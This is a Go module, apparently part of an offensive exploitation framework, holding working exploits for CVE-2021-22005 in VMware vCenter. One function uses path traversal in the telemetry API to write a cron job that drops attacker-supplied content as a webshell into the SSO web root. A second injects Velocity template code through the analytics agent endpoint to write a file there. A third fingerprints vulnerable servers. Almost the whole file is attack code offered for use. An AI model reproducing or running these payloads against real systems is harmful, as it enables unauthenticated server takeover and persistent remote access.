package exp_vcenter

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

// #####################编码转换模块生成#########################
func UnicodeEncode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType:    "char",
			CodeName:    "Unicode",
			CodeMode:    "Encode",
			CodeOptions: []code_model.CodeOption{},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

type Exp_CVE_2021_22005 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_22005) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	id := goutils.UUIDv4()
	metadata := goutils.RandStr(10)

	headers.Set("Content-Type", "application/json")
	setCeipUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/ui/ceip-ui/ctrl/ceip/status/true")

	// 发送请求, PUT
	httpresp := self.HttpPutWithoutRedirect(setCeipUrl, "{}", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Body == "true" {
		self.EchoSuccessMsg("开启ceip成功")
	} else if httpresp.Body == "false" {
		self.EchoErrMsg("开启ceip失败，目标未登录过")
	} else {
		self.EchoErrMsg("开启ceip失败，目标接口无法访问")
	}

	checkCeipUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/telemetry/ph/api/level?_c=vSphere.vapi.6_7&_i="+id)
	headers.Del("Content-Type")
	httpresp = self.HttpGetWithoutRedirect(checkCeipUrl, headers)

	if httpresp.Body == "\"FULL\"" {
		self.EchoSuccessMsg("ceip已开启, 状态为: " + httpresp.Body)
	} else if httpresp.Body == "\"OFF\"" {
		self.EchoErrMsg("ceip未开启，状态为：" + httpresp.Body)
	} else {
		self.EchoErrMsg("状态为：" + httpresp.Body)
	}

	self.EchoSuccessMsg("正在创建prod目录...")
	headers.Set("Content-Type", "application/json")
	headers.Set("X-Deployment-Secret", "secret")
	httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i="+metadata), "{}", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 201 {
		self.EchoSuccessMsg("创建prod目录成功")
	} else {
		self.EchoErrMsg("创建prod目录失败")
	}

	self.EchoSuccessMsg("正在创建_cvSphere.vapi.6_7_i目录...")
	httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/"+metadata), "{}", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode == 201 {
		self.EchoSuccessMsg("创建_cvSphere.vapi.6_7_i目录成功")
	} else {
		self.EchoErrMsg("创建_cvSphere.vapi.6_7_i目录失败")
	}

	uploadUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/../../../../../../etc/cron.d/"+metadata)

	payload := "*/1 * * * * root rm -rf /var/log/vmware/analytics/prod/* & rm -rf /etc/cron.d/{{name}}.json & (echo {{b64FileContent}} | base64 -d > /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{filename}})"
	payload = strings.ReplaceAll(payload, "{{name}}", metadata)
	payload = strings.ReplaceAll(payload, "{{b64FileContent}}", base64.StdEncoding.EncodeToString([]byte(content)))
	payload = strings.ReplaceAll(payload, "{{filename}}", filename)
	httpresp = self.HttpPostWithoutRedirect(uploadUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 201 {
		self.EchoSuccessMsg("等待一分钟，再验证")
		expResult.Status = true
		self.EchoSuccessMsg("shell: goutils.AppendUri(self.Params.BaseParam.Target, \"/websso/..;/\") + filename")

	}

	return
}

func (self *Exp_CVE_2021_22005) Attack_upload2() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	metadata := goutils.RandStr(10)

	headers.Set("Content-Type", "application/json")
	headers.Set("X-Deployment-Secret", "secret")
	headers.Set("X-Plugin-Type", metadata)

	// createAgent 请求
	createAgentUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB")
	httpresp := self.HttpPostWithoutRedirect(createAgentUrl, "{\"manifestSpec\": {\"resourceId\": \"b1\", \"dataType\": \"b2\", \"objectId\": \"b3\", \"versionDataType\": \"b4\", \"versionObjectId\": \"b5\"}, \"objectType\": \"a1\", \"collectionTriggerDataNeeded\": true, \"deploymentDataNeeded\": true, \"resultNeeded\": true, \"signalCollectionCompleted\": true, \"localManifestPath\": \"a2\", \"localPayloadPath\": \"a3\", \"localObfuscationMapPath\": \"a4\"}", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 201 {
		self.EchoSuccessMsg("createAgent成功")
	} else {
		self.EchoErrMsg("createAgent失败")
		return
	}

	// collectAgent
	collectAgentUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB")

	manifestContent := `<manifest recommendedPageSize="500">
   <request>
      <query name="vir:VCenter">
         <constraint>
            <targetType>ServiceInstance</targetType>
         </constraint>
         <propertySpec>
            <propertyNames>content.about.instanceUuid</propertyNames>
            <propertyNames>content.about.osType</propertyNames>
            <propertyNames>content.about.build</propertyNames>
            <propertyNames>content.about.version</propertyNames>
         </propertySpec>
      </query>
   </request>
   <cdfMapping>
      <indepedentResultsMapping>
         <resultSetMappings>
            <entry>
               <key>vir:VCenter</key>
               <value>
                  <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                     <resourceItemToJsonLdMapping>
                        <forType>ServiceInstance</forType>
                     <mappingCode><![CDATA[
                        #set($fileAppender = $GLOBAL-logger.getLogger().getParent().getAppender("LOGFILE"))
                        #set($origin_log = $fileAppender.getFile())
                        #set($rootLogger = $GLOBAL-logger.getLogger().getParent())
                        $fileAppender.setFile("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{filename}}")   
                        $fileAppender.activateOptions()  
                        $rootLogger.info("{{filecontent}}") 
                        $fileAppender.setFile($origin_log)     
                        $fileAppender.activateOptions()]]>
                     </mappingCode>
                     </resourceItemToJsonLdMapping>
                  </value>
               </value>
            </entry>
         </resultSetMappings>
      </indepedentResultsMapping>
   </cdfMapping>
   <requestSchedules>
      <schedule interval="1h">
         <queries>
            <query>vir:VCenter</query>
         </queries>
      </schedule>
   </requestSchedules>
</manifest>`

	encodeBytes, err := UnicodeEncode(content)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	content = strings.ReplaceAll(string(encodeBytes), `\`, `\\`)

	manifestContent = strings.ReplaceAll(manifestContent, "{{filecontent}}", content)
	manifestContent = strings.ReplaceAll(manifestContent, "{{filename}}", filename)
	manifestContent = strings.ReplaceAll(manifestContent, `"`, `\"`)
	manifestContent = strings.ReplaceAll(manifestContent, "\n", `\n`)

	payload := fmt.Sprintf(`{"manifestContent": "%s", "contextData": "a2", "objectId": "a3"}`, manifestContent)
	httpresp = self.HttpPostWithoutRedirect(collectAgentUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `collection_completed`) {
		self.EchoSuccessMsg("collectAgent成功")
		expResult.Status = true
		self.EchoSuccessMsg("shell: " + goutils.AppendUri(self.Params.BaseParam.Target, "/websso/..;/") + filename)
	}

	return
}

type AutoGenerated22005 struct {
	MSG     string `json:"MSG"`
	Type    string `json:"@type"`
	BUILD   string `json:"BUILD"`
	VERSION string `json:"VERSION"`
	OSTYPE  string `json:"OSTYPE"`
	ID      string `json:"@id"`
}

func (self *Exp_CVE_2021_22005) Attack_getmsg2() (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()

	metadata := goutils.RandStr(10)

	headers.Set("Content-Type", "application/json")
	headers.Set("X-Deployment-Secret", "secret")
	headers.Set("X-Plugin-Type", metadata)

	// createAgent 请求
	createAgentUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB")
	httpresp := self.HttpPostWithoutRedirect(createAgentUrl, "{\"manifestSpec\": {\"resourceId\": \"b1\", \"dataType\": \"b2\", \"objectId\": \"b3\", \"versionDataType\": \"b4\", \"versionObjectId\": \"b5\"}, \"objectType\": \"a1\", \"collectionTriggerDataNeeded\": true, \"deploymentDataNeeded\": true, \"resultNeeded\": true, \"signalCollectionCompleted\": true, \"localManifestPath\": \"a2\", \"localPayloadPath\": \"a3\", \"localObfuscationMapPath\": \"a4\"}", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 201 {
		self.EchoSuccessMsg("漏洞存在")
		self.EchoSuccessMsg("createAgent成功")
	} else {
		self.EchoErrMsg("createAgent失败")
		return
	}

	// collectAgent
	collectAgentUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB")

	manifestContent := `<manifest recommendedPageSize="500">
   <request>
      <query name="vir:VCenter">
         <constraint>
            <targetType>ServiceInstance</targetType>
         </constraint>
         <propertySpec>
            <propertyNames>content.about.instanceUuid</propertyNames>
            <propertyNames>content.about.osType</propertyNames>
            <propertyNames>content.about.build</propertyNames>
            <propertyNames>content.about.version</propertyNames>
         </propertySpec>
      </query>
   </request>
   <cdfMapping>
      <indepedentResultsMapping>
         <resultSetMappings>
            <entry>
               <key>vir:VCenter</key>
               <value>
                  <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                     <resourceItemToJsonLdMapping>
                        <forType>ServiceInstance</forType>
                     <mappingCode><![CDATA[
                        #set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())
                        #set($objectId = "vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid")
                        #set($obj = $LOCAL-cdf20Result.newObject("vim.ServiceInstance", $objectId))
                        $obj.addProperty("MSG", "exist")
                        $obj.addProperty("OSTYPE", $content-about-osType)
                        $obj.addProperty("BUILD", $content-about-build)
                        $obj.addProperty("VERSION", $content-about-version)]]>
                     </mappingCode>
                     </resourceItemToJsonLdMapping>
                  </value>
               </value>
            </entry>
         </resultSetMappings>
      </indepedentResultsMapping>
   </cdfMapping>
   <requestSchedules>
      <schedule interval="1h">
         <queries>
            <query>vir:VCenter</query>
         </queries>
      </schedule>
   </requestSchedules>
</manifest>`

	manifestContent = strings.ReplaceAll(manifestContent, `"`, `\"`)
	manifestContent = strings.ReplaceAll(manifestContent, "\n", `\n`)

	payload := fmt.Sprintf(`{"manifestContent": "%s", "contextData": "a2", "objectId": "a3"}`, manifestContent)
	httpresp = self.HttpPostWithoutRedirect(collectAgentUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	if httpresp.Resp.StatusCode == 200 {
		results := new(AutoGenerated22005)
		err := json.Unmarshal([]byte(httpresp.Body), results)
		if err == nil && results.MSG == "exist" {
			self.EchoSuccessMsg("BUILD: " + results.BUILD)
			self.EchoSuccessMsg("VERSION: " + results.VERSION)
			self.EchoSuccessMsg("OSTYPE: " + results.OSTYPE)
		}

	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_22005{}, "exp_CVE_2021_22005.yml")

}
